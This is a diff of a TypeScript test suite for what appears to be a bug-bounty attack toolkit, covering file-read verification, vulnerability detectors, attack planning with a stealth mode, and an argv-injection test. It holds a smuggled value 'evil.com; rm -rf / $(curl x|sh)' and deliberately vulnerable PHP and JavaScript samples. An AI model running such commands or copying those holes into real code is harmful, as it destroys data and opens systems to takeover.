@@ -72,7 +72,7 @@ const es = enrichScan(target) as any;
 check("enrichScan matched chains", es.matched_chains.length >= 1, `matched=${es.matched_chains.length}`);
 
 const re = runEngagement(target, "", "bug-bounty") as any;
-check("engagement COMPLETE", re.status === "COMPLETE" && re.scope.enforcement === "source-audit");
+check("engagement DETECTED (not COMPLETE — verify is next)", re.status === "DETECTED" && re.scope.enforcement === "source-audit");
 check("engagement hypothesis findings", re.findings.length >= 1 && re.findings.every((f: any) => f.status === "hypothesis"), `n=${re.findings.length}`);
 check("engagement findings carry evidence + confidence", re.findings.every((f: any) => f.evidence_count >= 1 && typeof f.confidence === "number" && typeof f.confidence_level === "string"), `first=${JSON.stringify(re.findings[0] ?? {}).slice(0, 120)}`);
 check("engagement URL never blocked (disclaimer mode)", (runEngagement("https://evil.com", "", "bug-bounty") as any).status !== "BLOCKED");
@@ -726,13 +726,212 @@ check("sseMessage: parse event message data", _sse("event: message\ndata: {\"res
 // 27. installAllTools — bulk provisioning summary (empty category -> no installs)
 import { installAllTools as _installAll } from "../src/catalog.ts";
 const _emptyInstall = await _installAll({ category: "zzz-nonexistent" });
-check("installAllTools: empty category -> 0 targets, 2 mcp skipped", (_emptyInstall.target_count as number) === 0 && (_emptyInstall.skipped_mcp_servers as string[]).length === 2, `targets=${_emptyInstall.target_count} mcp=${(_emptyInstall.skipped_mcp_servers as string[]).length}`);
+const _manual = (_emptyInstall.skipped_manual as string[]) ?? [];
+check("installAllTools: empty category -> 0 targets, manual tools skipped (burp + GUI)", (_emptyInstall.target_count as number) === 0 && _manual.includes("burp-suite-mcp") && _manual.includes("ghidra") && _manual.includes("havoc"), `targets=${_emptyInstall.target_count} manual=${_manual.length} [${_manual.join(",")}]`);
+
+// 28. HackerOne research header (env-driven, deterministic)
+import { researchHeaders as _rh, h1Username as _h1u } from "../src/http.ts";
+const _prevH1 = process.env.H1_USERNAME;
+process.env.H1_USERNAME = "test-researcher";
+check("researchHeaders: X-HackerOne-Research injected when H1_USERNAME set", _rh()["X-HackerOne-Research"] === "test-researcher" && _h1u() === "test-researcher", JSON.stringify(_rh()));
+if (_prevH1 === undefined) delete process.env.H1_USERNAME; else process.env.H1_USERNAME = _prevH1;
+check("researchHeaders: empty when H1_USERNAME unset", Object.keys(_rh()).length === 0, JSON.stringify(_rh()));
+
+// 29. verifyFileRead — deterministic arbitrary-file-read verification
+import { verifyFileRead as _vfr } from "../src/strike.ts";
+const _frBlocked = await _vfr({ url: "http://127.0.0.1:1/read", method: "POST", bodyRaw: true, timeoutMs: 2000 });
+check("verifyFileRead: unreachable -> blocked", _frBlocked.status === "blocked", JSON.stringify(_frBlocked.status));
+const _frNone = await _vfr({ url: "https://httpbin.org/anything", method: "POST", bodyRaw: true, timeoutMs: 10000 });
+check("verifyFileRead: no passwd content -> not falsely confirmed", _frNone.status !== "confirmed" && _frNone.file_read === false, JSON.stringify({ status: _frNone.status, marker_file: _frNone.marker_file_content, control_file: _frNone.control_file_content }));
+
+// 30. checkMcpServers — MCP integration availability probe
+import { checkMcpServers as _cms } from "../src/mcp-status.ts";
+const _mcps = await _cms();
+check("checkMcpServers: returns chrome-devtools-mcp + burp-suite-mcp", _mcps.length === 2 && _mcps.some((m) => m.name === "chrome-devtools-mcp") && _mcps.some((m) => m.name === "burp-suite-mcp"), JSON.stringify(_mcps.map((m) => m.name)));
+check("checkMcpServers: each entry has available+kind+detail", _mcps.every((m) => typeof m.available === "boolean" && (m.kind === "stdio" || m.kind === "sse") && typeof m.detail === "string"), JSON.stringify(_mcps.map((m) => ({ n: m.name, a: m.available, k: m.kind }))));
+
+// 31. makeFinding with evidence — evidence attached at creation (never born empty)
+import { makeFinding as _mk } from "../src/finding.ts";
+const _fEv = _mk({
+  title: "arbitrary file read", target: { type: "web", host: "h", endpoint: "/viewLogFile" },
+  severity: "high", cwe: "CWE-22",
+  source: { type: "post_body", name: "fullpath" }, sink: { type: "file_operations", symbol: "x" },
+  evidence: [{ type: "response", description: "marker read", content: "root:x:0:0:" }],
+});
+check("makeFinding: evidence attached at creation", ((_fEv.evidence ?? []).length === 1) && (((_fEv.evidence ?? [])[0]?.artifacts?.length ?? 0) === 1), JSON.stringify((_fEv.evidence ?? []).map((e) => e.type)));
+const _fNoEv = _mk({ title: "t2", target: { type: "web", host: "h", endpoint: "/e" }, severity: "low", source: { type: "header", name: "x" }, sink: { type: "y", symbol: "z" } });
+check("makeFinding: no evidence -> empty (flag via report evidence_less_findings)", (_fNoEv.evidence ?? []).length === 0, JSON.stringify((_fNoEv.evidence ?? []).length));
 
 // 23. buildCatalogCommand — target always reaches the command (no-required-flag bug)
 import { buildCatalogCommand as _buildCmd } from "../src/catalog.ts";
 check("buildCatalogCommand: required -d flag gets target", JSON.stringify(_buildCmd({ command: "subfinder", flags: [{ name: "-d", type: "string", required: true }] }, "example.com")) === JSON.stringify(["subfinder", "-d", "example.com"]), JSON.stringify(_buildCmd({ command: "subfinder", flags: [{ name: "-d", type: "string", required: true }] }, "example.com")));
 check("buildCatalogCommand: no-required-flag -> positional target (curl bug fixed)", JSON.stringify(_buildCmd({ command: "curl", flags: [{ name: "-i", type: "boolean" }, { name: "-d", type: "string" }] }, "http://x.example/")) === JSON.stringify(["curl", "http://x.example/"]), JSON.stringify(_buildCmd({ command: "curl", flags: [{ name: "-i", type: "boolean" }, { name: "-d", type: "string" }] }, "http://x.example/")));
 check("buildCatalogCommand: unambiguous -u flag preferred over positional", JSON.stringify(_buildCmd({ command: "tool", flags: [{ name: "-u", type: "string" }, { name: "-v", type: "boolean" }] }, "http://t.example/")) === JSON.stringify(["tool", "-u", "http://t.example/"]), JSON.stringify(_buildCmd({ command: "tool", flags: [{ name: "-u", type: "string" }, { name: "-v", type: "boolean" }] }, "http://t.example/")));
+check("buildCatalogCommand: malicious target stays a single argv element (no shell injection)", JSON.stringify(_buildCmd({ command: "subfinder", flags: [{ name: "-d", type: "string", required: true }] }, "evil.com; rm -rf / $(curl x|sh)")) === JSON.stringify(["subfinder", "-d", "evil.com; rm -rf / $(curl x|sh)"]), JSON.stringify(_buildCmd({ command: "subfinder", flags: [{ name: "-d", type: "string", required: true }] }, "evil.com; rm -rf / $(curl x|sh)")));
+
+// 32. chain-executor — generic dispatch (scan/crack/defer, hermetic — no network)
+import { executeChainSteps as _ecs } from "../src/chain-executor.ts";
+const _cf = _mk({ title: "code exec", target: { type: "web", host: "h", endpoint: "/e" }, severity: "medium", source: { type: "query", name: "q" }, sink: { type: "code_execution", symbol: "eval" }, evidence: [{ type: "tool_output", description: "leaked", content: "eval(userInput); system(cmd);" }] });
+const _scanSteps = await _ecs(_cf, [{ order: 1, action: "scan leaked source", tool_hint: "scan_leaked_source" }]);
+check("chain-executor: scan_leaked_source dispatched + executed", _scanSteps.length === 1 && _scanSteps[0].outcome === "executed" && _scanSteps[0].tool === "scan_leaked_source", JSON.stringify({ outcome: _scanSteps[0].outcome, tool: _scanSteps[0].tool }));
+const _crackSteps = await _ecs(_cf, [{ order: 1, action: "crack hashes", tool_hint: "crack_hash" }]);
+check("chain-executor: crack_hash no-hash -> executed + hashes_found 0 (no network)", _crackSteps[0].outcome === "executed" && (JSON.stringify(_crackSteps[0].detail ?? {}).includes("hashes_found")), JSON.stringify(_crackSteps[0].detail));
+const _deferSteps = await _ecs(_cf, [{ order: 1, action: "run unknown", tool_hint: "some_unknown_tool_xyz" }]);
+check("chain-executor: unknown tool -> deferred (not error)", _deferSteps[0].outcome === "deferred", JSON.stringify(_deferSteps[0].outcome));
+
+// 33. memory — remember/dedup/lookup/forget lifecycle (self-cleaning)
+import { remember as _rem, memoryLookup as _mlu, forget as _frg } from "../src/memory.ts";
+const _memTopic = `blitzstrike-test-${Date.now()}`;
+const _mr1 = _rem(_memTopic, "unique test content", "lesson", ["test"], "test");
+check("memory: remember -> saved", _mr1.saved === true && typeof _mr1.id === "string", JSON.stringify(_mr1));
+const _mr2 = _rem(_memTopic, "unique test content", "lesson", ["test"], "test");
+check("memory: remember same -> duplicate (dedup)", _mr2.saved === false && _mr2.duplicate === true, JSON.stringify(_mr2));
+const _lu = _mlu(_memTopic);
+check("memory: lookup finds the entry", _lu.found === true, JSON.stringify(_lu));
+const _fr1 = _frg(String(_mr1.id));
+check("memory: forget -> removed", _fr1.removed === true, JSON.stringify(_fr1));
+const _fr2 = _frg(String(_mr1.id));
+check("memory: forget again -> not found", _fr2.removed === false, JSON.stringify(_fr2));
+
+// 34. complex-bugs — deep detectors (deserialization/type-juggling/SSRF/...)
+import { detectComplexBugs as _dcb } from "../src/complex-bugs.ts";
+check("complex-bugs: deserialization + magic method", _dcb("<?php\n$data = $_GET['data'];\n$obj = unserialize($data);\nclass X { function __destruct() { system('id'); } }\n", "a.php").some((f) => f.type === "deserialization"), JSON.stringify(_dcb("<?php\n$data = $_GET['data'];\n$obj = unserialize($data);\nclass X { function __destruct() { system('id'); } }\n", "a.php").map((f) => f.type)));
+check("complex-bugs: type juggling (loose ==)", _dcb("<?php\nif ($_GET['password'] == $secret) { echo 'ok'; }\n", "b.php").some((f) => f.type === "type_juggling"), JSON.stringify(_dcb("<?php\nif ($_GET['password'] == $secret) { echo 'ok'; }\n", "b.php").map((f) => f.type)));
+check("complex-bugs: mass assignment (extract)", _dcb("<?php\nextract($_REQUEST);\n", "c.php").some((f) => f.type === "mass_assignment"), JSON.stringify(_dcb("<?php\nextract($_REQUEST);\n", "c.php").map((f) => f.type)));
+check("complex-bugs: prototype pollution (Object.assign)", _dcb("const x = Object.assign({}, req.body);\n", "d.js").some((f) => f.type === "prototype_pollution"), JSON.stringify(_dcb("const x = Object.assign({}, req.body);\n", "d.js").map((f) => f.type)));
+check("complex-bugs: SSRF (file_get_contents)", _dcb("<?php\n$url = $_GET['url'];\necho file_get_contents($url);\n", "e.php").some((f) => f.type === "ssrf"), JSON.stringify(_dcb("<?php\n$url = $_GET['url'];\necho file_get_contents($url);\n", "e.php").map((f) => f.type)));
+check("complex-bugs: SSTI (ejs.render)", _dcb("const html = ejs.render(req.query.template);\n", "f.js").some((f) => f.type === "ssti"), JSON.stringify(_dcb("const html = ejs.render(req.query.template);\n", "f.js").map((f) => f.type)));
+check("complex-bugs: XXE (simplexml_load_string)", _dcb("<?php\n$xml = $_GET['xml'];\n$doc = simplexml_load_string($xml);\n", "g.php").some((f) => f.type === "xxe"), JSON.stringify(_dcb("<?php\n$xml = $_GET['xml'];\n$doc = simplexml_load_string($xml);\n", "g.php").map((f) => f.type)));
+check("complex-bugs: clean code -> no findings", _dcb("<?php\n$a = 1 + 2;\necho $a;\n", "h.php").length === 0, JSON.stringify(_dcb("<?php\n$a = 1 + 2;\necho $a;\n", "h.php").map((f) => f.type)));
+
+// 35. route-confusion — dispatch/route abuse detectors
+import { detectRouteConfusion as _drc } from "../src/route-confusion.ts";
+check("route-confusion: dynamic dispatch (call_user_func)", _drc("<?php\ncall_user_func($_GET['callback']);\n", "r1.php").some((f) => f.type === "dynamic_dispatch"), JSON.stringify(_drc("<?php\ncall_user_func($_GET['callback']);\n", "r1.php").map((f) => f.type)));
+check("route-confusion: dynamic method call", _drc("<?php\n$m = $_GET['m'];\n$obj->$m();\n", "r2.php").some((f) => f.type === "dynamic_method_call"), JSON.stringify(_drc("<?php\n$m = $_GET['m'];\n$obj->$m();\n", "r2.php").map((f) => f.type)));
+check("route-confusion: dynamic include", _drc("<?php\ninclude($_GET['page']);\n", "r3.php").some((f) => f.type === "dynamic_include"), JSON.stringify(_drc("<?php\ninclude($_GET['page']);\n", "r3.php").map((f) => f.type)));
+check("route-confusion: batch forwarding loop", _drc("<?php\nforeach ($requests as $r) { forward($r); }\n", "r4.php").some((f) => f.type === "batch_forwarding"), JSON.stringify(_drc("<?php\nforeach ($requests as $r) { forward($r); }\n", "r4.php").map((f) => f.type)));
+check("route-confusion: clean code -> no findings", _drc("<?php\n$a = 1;\necho $a;\n", "r5.php").length === 0, JSON.stringify(_drc("<?php\n$a = 1;\necho $a;\n", "r5.php").map((f) => f.type)));
+
+// 36. universal-taint — language adapters + generic engine (hermetic)
+import "../src/adapters.ts";
+import { analyzeTaintUniversal as _atu, detectLanguage as _dl, listLanguages as _ll } from "../src/universal-taint.ts";
+const _phpTaintRes = _atu("<?php\n$x = $_GET['id'];\nsystem($x);\n", "t.php");
+check("taint: php command injection -> command_execution finding", _phpTaintRes.findings.length > 0 && _phpTaintRes.findings.some((f) => f.sink === "command_execution"), JSON.stringify(_phpTaintRes.findings.map((f) => f.sink)));
+const _phpSanRes = _atu("<?php\n$x = $_GET['id'];\n$y = escapeshellarg($x);\nsystem($y);\n", "s.php");
+check("taint: escapeshellarg sanitizer -> suppressed (0 findings)", _phpSanRes.findings.length === 0, JSON.stringify({ findings: _phpSanRes.findings.length, suppressed: _phpSanRes.suppressed }));
+check("taint: detectLanguage by extension", _dl("x.php")?.language === "php" && _dl("x.py")?.language === "python" && _dl("x.js")?.language === "javascript", `${_dl("x.php")?.language},${_dl("x.py")?.language},${_dl("x.js")?.language}`);
+check("taint: listLanguages 4 (php/js/python/java)", _ll().length === 4, JSON.stringify(_ll().map((l) => l.language)));
+
+// 37. saveReport — report persistence to disk (regression for reports/ output)
+import { saveReport as _saveRep, reportMarkdown as _rm } from "../src/report.ts";
+import { existsSync as _ef, rmSync as _rmf, readFileSync as _rfs } from "node:fs";
+const _rf = _mk({ title: "persistence test", target: { type: "web", host: "h", endpoint: "/e" }, severity: "low", source: { type: "header", name: "x" }, sink: { type: "y", symbol: "z" } });
+const _repTxt = _rm([_rf], { title: "persistence test", scope: "example.com" });
+const _savedRep = _saveRep(_repTxt, { title: "persistence test", scope: "example.com" });
+check("saveReport: writes .md to reports dir + file exists", typeof _savedRep.path === "string" && _ef(_savedRep.path) && _savedRep.path.endsWith(".md"), _savedRep.path);
+check("saveReport: on-disk content matches the report text", _ef(_savedRep.path) && _rfs(_savedRep.path, "utf8") === _repTxt, _savedRep.path);
+_rmf(_savedRep.path, { force: true });
+
+// 38. FP regression — benign samples must NOT be flagged (precision fixes)
+import { detectComplexBugs as _cb2 } from "../src/complex-bugs.ts";
+import { detectRouteConfusion as _rc2 } from "../src/route-confusion.ts";
+check("FP fix: canonicalized include not flagged", _rc2("<?php\n$f = basename($_GET['f']);\ninclude($f);\n", "x.php").every((f) => f.type !== "dynamic_include"), JSON.stringify(_rc2("<?php\n$f = basename($_GET['f']);\ninclude($f);\n", "x.php").map((f) => f.type)));
+check("FP fix: whitelist dispatch not flagged", _rc2("<?php\n$cb = $_GET['cb'];\ncall_user_func($map[$cb]);\n", "x.php").every((f) => f.type !== "dynamic_dispatch"), JSON.stringify(_rc2("<?php\n$cb = $_GET['cb'];\ncall_user_func($map[$cb]);\n", "x.php").map((f) => f.type)));
+check("FP fix: batch forwarding with auth not flagged", _rc2("<?php\nforeach ($requests as $r) { if (!authorize($r)) continue; handle($r); }\n", "x.php").every((f) => f.type !== "batch_forwarding"), JSON.stringify(_rc2("<?php\nforeach ($requests as $r) { if (!authorize($r)) continue; handle($r); }\n", "x.php").map((f) => f.type)));
+check("FP fix: constrained ssrf (fixed host) not flagged", _cb2("<?php\necho file_get_contents(\"https://api.example.com/\" . $_GET['path']);\n", "x.php").length === 0, JSON.stringify(_cb2("<?php\necho file_get_contents(\"https://api.example.com/\" . $_GET['path']);\n", "x.php").map((f) => f.type)));
+
+// 39. benchmark — per-detector precision + zero FP (precision regression)
+import { runBenchmark as _rbench } from "../src/benchmark.ts";
+const _benchRes = _rbench();
+const _bd = _benchRes.by_detector as Record<string, { precision: number }>;
+check("benchmark: per-detector breakdown (taint/complex_bugs/route_confusion)", !!_bd && !!_bd.taint && !!_bd.complex_bugs && !!_bd.route_confusion, JSON.stringify(Object.keys(_bd ?? {})));
+check("benchmark: zero false positives + precision 1.0", (_benchRes.fp as number) === 0 && _benchRes.precision === 1, `fp=${_benchRes.fp} precision=${_benchRes.precision} total=${_benchRes.total_cases}`);
+
+// 40. attack_plan — success_probability + estimated_time + mode (derived, deterministic)
+import { attackPlan as _ap } from "../src/intel.ts";
+const _apFull = _ap("https://example.com", ["flask"], ["url"]) as Record<string, unknown>;
+const _apPlanFull = _apFull.plan as Array<Record<string, unknown>>;
+check("attack_plan: derived fields present (success_probability + estimated_time_sec + total)", _apFull.mode === "full" && typeof _apFull.total_estimated_time_sec === "number" && _apPlanFull.every((p) => typeof p.success_probability === "number" && typeof p.estimated_time_sec === "number"), JSON.stringify({ mode: _apFull.mode, n: _apPlanFull.length, total: _apFull.total_estimated_time_sec }));
+check("attack_plan: success_probability derived from priority (1->0.85, 2->0.70, 4->0.40)", _apPlanFull.some((p) => p.priority === 1 && p.success_probability === 0.85) && _apPlanFull.some((p) => p.priority === 2 && p.success_probability === 0.7) && _apPlanFull.some((p) => p.priority === 4 && p.success_probability === 0.4), "formula: clamp(0.85-0.15*(p-1))");
+const _apQuick = _ap("https://example.com", ["flask"], ["url"], "quick") as Record<string, unknown>;
+const _apQuickPlan = _apQuick.plan as Array<Record<string, unknown>>;
+check("attack_plan: quick mode -> only priority<=2 (fewer than full)", _apQuickPlan.every((p) => (p.priority as number) <= 2) && _apQuickPlan.length < _apPlanFull.length, `quick=${_apQuickPlan.length} full=${_apPlanFull.length}`);
+const _apStealth = _ap("https://example.com", ["flask"], ["url"], "stealth") as Record<string, unknown>;
+const _apStealthPlan = _apStealth.plan as Array<Record<string, unknown>>;
+check("attack_plan: stealth mode -> passive only (no active injection)", _apStealthPlan.every((p) => !["xss", "sql_injection", "ssti", "command_injection", "ssrf", "path_traversal", "xxe", "file_upload"].includes(p.vector as string)), JSON.stringify(_apStealthPlan.map((p) => p.vector)));
+check("attack_plan: deterministic (same input -> byte-identical)", JSON.stringify(_ap("https://example.com", ["flask"], ["url"])) === JSON.stringify(_ap("https://example.com", ["flask"], ["url"])), "byte-identical");
+
+// 41. self-hardening — capture_false_positive -> corpus -> benchmark (closed loop)
+import { captureFalsePositive as _cfp, loadCorpus as _lc, runBenchmark as _rb2 } from "../src/benchmark.ts";
+const _fpCode = "<?php\n$cb = $_GET['cb'];\ncall_user_func($map[$cb]);\n";
+const _cap = _cfp({ code: _fpCode, language: "php", detector: "route_confusion", note: "whitelist dispatch (fp regression test)" });
+check("self-hardening: capture writes .md + returns safe entry", _cap.path.endsWith(".md") && _cap.entry.vulnerable === false && _cap.entry.detector === "route_confusion", _cap.path);
+check("self-hardening: loadCorpus merges the captured entry", _lc().some((e) => e.id === _cap.entry.id), _cap.entry.id);
+const _bench2 = _rb2();
+const _capSec = _bench2.captured_false_positives as { total: number; still_flagged: number; entries: Array<{ id: string; still_flagged: boolean }> };
+check("self-hardening: benchmark reports captured_false_positives", typeof _capSec?.total === "number" && _capSec.entries.some((e) => e.id === _cap.entry.id), JSON.stringify({ total: _capSec?.total, still: _capSec?.still_flagged }));
+_rmf(_cap.path, { force: true });
+
+// 42. intelligence ledger — record/hit-rates/empirical prior (enterprise loop)
+import { recordVerdict as _rv, hitRates as _hr, empiricalPrior as _ep, sinkToVector as _stv, loadIntel as _li } from "../src/intelligence.ts";
+import { writeFileSync as _wfs2 } from "node:fs";
+import { join as _join } from "node:path";
+import { homedir as _homedir } from "node:os";
+check("intelligence: sinkToVector maps sink -> vector", _stv("sql_execution") === "sql_injection" && _stv("html_render") === "xss", `${_stv("sql_execution")},${_stv("html_render")}`);
+const _tk = `testtech${Date.now()}`;
+_rv({ vector: "ssti", tech: _tk, outcome: "confirmed", target: "a1" });
+_rv({ vector: "ssti", tech: _tk, outcome: "confirmed", target: "a2" });
+_rv({ vector: "ssti", tech: _tk, outcome: "confirmed", target: "a3" });
+_rv({ vector: "xxe", tech: _tk, outcome: "false_positive", target: "b1" });
+_rv({ vector: "xxe", tech: _tk, outcome: "false_positive", target: "b2" });
+_rv({ vector: "xxe", tech: _tk, outcome: "false_positive", target: "b3" });
+const _hrRes = _hr(_tk);
+const _hrEntries = _hrRes.entries as Array<{ vector: string; tested: number; hit_rate: number }>;
+check("intelligence: hitRates aggregates (ssti 3/3=1.0, xxe 0/3=0.0)", _hrEntries.some((e) => e.vector === "ssti" && e.tested === 3 && e.hit_rate === 1) && _hrEntries.some((e) => e.vector === "xxe" && e.tested === 3 && e.hit_rate === 0), JSON.stringify(_hrEntries));
+check("intelligence: empiricalPrior Bayesian (100% up, 0% down, no-data=formula)", _ep("ssti", _tk, 0.70) > 0.70 && _ep("xxe", _tk, 0.70) < 0.70 && _ep("nosql_injection", _tk, 0.70) === 0.70, `ssti=${_ep("ssti", _tk, 0.70)} xxe=${_ep("xxe", _tk, 0.70)}`);
+const _intPath = _join(_homedir(), ".blitzstrike", "intelligence.jsonl");
+const _keptIntel = _li().filter((e) => e.tech !== _tk);
+_wfs2(_intPath, _keptIntel.map((e) => JSON.stringify(e)).join("\n") + (_keptIntel.length ? "\n" : ""));
+
+// 43. compliance — CWE -> OWASP/ASVS/PCI/ISO/NIST mapping
+import { complianceMap as _cmap, complianceSummary as _csum } from "../src/compliance.ts";
+const _cm89 = _cmap("CWE-89");
+const _cm79 = _cmap("79");
+check("compliance: maps CWE-89 (prefix + bare) to SQLi + frameworks", _cm89?.name.includes("SQL") && _cm89?.owasp_top10 === "A03:2021 Injection" && _cm89?.pci?.includes("6.5.1") && _cm79?.name.includes("XSS"), JSON.stringify(_cm89));
+check("compliance: unknown CWE -> null", _cmap("999") === null, String(_cmap("999")));
+const _csumRes = _csum(["89", "79", "89", "999"]);
+check("compliance: summary aggregates + dedups + counts unmapped", _csumRes.total_mapped === 3 && _csumRes.total_unmapped === 1 && _csumRes.mappings.length === 2 && _csumRes.by_owasp["A03:2021 Injection"] === 3, JSON.stringify({ mapped: _csumRes.total_mapped, unmapped: _csumRes.total_unmapped, unique: _csumRes.mappings.length, owasp: _csumRes.by_owasp }));
+check("compliance: full CWE coverage (LDAP/CRLF/JWT/XPATH/header-injection)", Boolean(_cmap("90")?.name.includes("LDAP") && _cmap("93")?.name.includes("CRLF") && _cmap("347")?.name.includes("JWT") && _cmap("643")?.name.includes("XPath") && _cmap("644")?.name.includes("Header")), `${_cmap("90")?.name},${_cmap("347")?.name}`);
+
+// 44. proof-obligation — single-decision loop (structure by construction)
+import { createObligation as _co, nextObligation as _no, dischargeObligation as _do, listObligations as _lo, loadObligations as _lob } from "../src/obligations.ts";
+const _obl = _co({ claim: `test-obligation-${Date.now()}`, correlation_id: "test-corr" });
+check("obligation: create -> open + listed + complete=false", _obl.status === "open" && (_lo().open_obligations as Array<{ id: string }>).some((o) => o.id === _obl.id) && _lo().complete === false, _obl.id);
+const _next = _no();
+check("obligation: next_obligation returns an open obligation + instruction", _next.done === false && typeof (_next as Record<string, unknown>).obligation === "object", JSON.stringify(_next).slice(0, 60));
+const _dres = _do({ id: _obl.id, status: "refuted" });
+check("obligation: discharge -> refuted + remaining tracked", _dres.discharged === true && _dres.status === "refuted", JSON.stringify(_dres));
+const _obPath = _join(_homedir(), ".blitzstrike", "obligations.jsonl");
+const _keptObl = _lob().filter((o) => !o.claim.startsWith("test-obligation-"));
+_wfs2(_obPath, _keptObl.map((o) => JSON.stringify(o)).join("\n") + (_keptObl.length ? "\n" : ""));
+
+// 45. security-state lattice — wrong-context sanitization (beyond binary taint)
+import { analyzeSecurityState as _ass, detectWrongSanitizer as _dws } from "../src/security-state.ts";
+check("security-state: sanitize_text_field->SQL = vulnerable (wrong context)", _ass({ sanitizers: ["sanitize_text_field"], sinkType: "sql_execution" }).verdict === "vulnerable", "wrong context");
+check("security-state: esc_sql->SQL = safe (correct context)", _ass({ sanitizers: ["esc_sql"], sinkType: "sql_execution" }).verdict === "safe", "correct context");
+check("security-state: absint->SQL = safe (validated)", _ass({ sanitizers: ["absint"], sinkType: "sql_execution" }).verdict === "safe", "validated");
+check("security-state: base64_encode->SQL = vulnerable (pseudo-sanitizer)", _ass({ sanitizers: ["base64_encode"], sinkType: "sql_execution" }).verdict === "vulnerable", "pseudo");
+const _phpWrong = `<?php
+$name = sanitize_text_field($_GET['name']);
+$wpdb->query("SELECT * FROM t WHERE n='$name'");
+`;
+const _phpRight = `<?php
+$name = esc_sql($_GET['name']);
+$wpdb->query("SELECT * FROM t WHERE n='$name'");
+`;
+const _dwf = _dws(_phpWrong, "inline");
+check("security-state: detectWrongSanitizer flags wrong-context", _dwf.length === 1 && _dwf[0].type === "wrong_sanitizer", String(_dwf.length));
+check("security-state: detectWrongSanitizer skips correct-context", _dws(_phpRight, "inline").length === 0, "0 findings");
 
 console.log();
 const nPass = results.filter(([, ok]) => ok).length;
